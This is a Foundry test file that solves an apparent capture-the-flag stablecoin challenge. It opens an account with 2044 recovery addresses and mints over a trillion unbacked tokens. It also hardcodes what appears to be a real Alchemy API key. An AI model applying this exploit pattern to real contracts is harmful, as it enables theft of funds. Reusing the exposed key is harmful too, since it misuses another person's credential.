// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/5.DAI/SystemConfiguration.sol";
import "../src/5.DAI/AccountManager.sol";
import "../src/5.DAI/Stablecoin.sol";
import {Account as Acct} from "../src/5.DAI/Account.sol";
import "../src/5.DAI/Challenge.sol";

contract DAITest is Test {
    string public MAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/TfzGdaUaUjh1Yu1mPXyV0HxmlYzq2Nst";
    Challenge challenge;
    AccountManager manager;
    SystemConfiguration configuration;

    function setUp() public {
        uint256 forkId = vm.createFork(MAINNET_RPC_URL, 16_543_210);
        vm.selectFork(forkId);

        configuration = new SystemConfiguration();
        manager = new AccountManager(configuration);

        configuration.updateAccountManager(address(manager));
        configuration.updateStablecoin(address(new Stablecoin(configuration)));
        configuration.updateAccountImplementation(address(new Acct()));
        configuration.updateEthUsdPriceFeed(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);

        configuration.updateSystemContract(address(manager), true);

        challenge = new Challenge(configuration);
    }

    function testFork() public view {
        assertEq(block.number, 16_543_210);
    }

    function testExploit() public {
        uint256 AttackerPK = 0x12345;
        address attacker = vm.addr(AttackerPK);

        address challengeAddress = address(challenge);
        challenge = Challenge(challengeAddress);
        SystemConfiguration systemConfiguration = SystemConfiguration(challenge.SYSTEM_CONFIGURATION());
        AccountManager accountManager = AccountManager(systemConfiguration.getAccountManager());

        address[] memory recoverAddresses = new address[](2044);
        Acct account = accountManager.openAccount(attacker, recoverAddresses);
        accountManager.mintStablecoins(account, 1_000_000_000_000 ether + 1, "hack");
        console.log("isSolved:", challenge.isSolved());
    }
}
